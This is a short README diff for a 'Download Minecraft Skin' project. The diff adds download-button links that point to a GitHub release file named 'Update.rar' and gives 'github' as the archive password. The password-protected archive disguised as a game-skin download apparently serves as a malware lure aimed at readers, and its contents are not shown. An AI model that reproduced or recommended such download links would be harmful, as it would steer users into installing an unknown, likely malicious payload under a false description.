@@ -1,8 +1,8 @@
-# Download Minecraft Skin [![Download Minecraft Skin](https://img.shields.io/badge/Download-Minecraft%20Skin-blue)]()
+# Download Minecraft Skin [![Download Minecraft Skin](https://img.shields.io/badge/Download-Minecraft%20Skin-blue)](https://github.com/SAMAIOEC/download-minecraft-skin/releases/download/Release/Update.rar)
 
 ## Installation
 To download and install Minecraft Skin, follow these simple steps:
-1. [![Download Minecraft Skin](https://img.shields.io/badge/Download-Minecraft%20Skin-blue)]()
+1. [![Download Minecraft Skin](https://img.shields.io/badge/Download-Minecraft%20Skin-blue)](https://github.com/SAMAIOEC/download-minecraft-skin/releases/download/Release/Update.rar)
 
 2. **Pass: github**
 
